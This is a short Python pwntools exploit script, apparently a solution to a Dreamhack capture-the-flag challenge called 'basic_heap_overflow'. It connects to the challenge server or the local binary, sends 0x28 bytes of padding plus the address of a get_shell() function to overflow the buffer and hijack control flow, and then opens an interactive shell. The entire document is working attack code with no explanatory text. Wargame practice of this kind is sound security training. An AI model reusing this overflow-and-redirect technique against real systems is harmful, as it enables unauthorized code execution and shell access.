from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_heap_overflow')
else:
    r = remote('host1.dreamhack.games', 18583)

get_shell = 0x804867b  # get_shell()

r.sendline(b'a' * 0x28 + p32(get_shell))

r.interactive()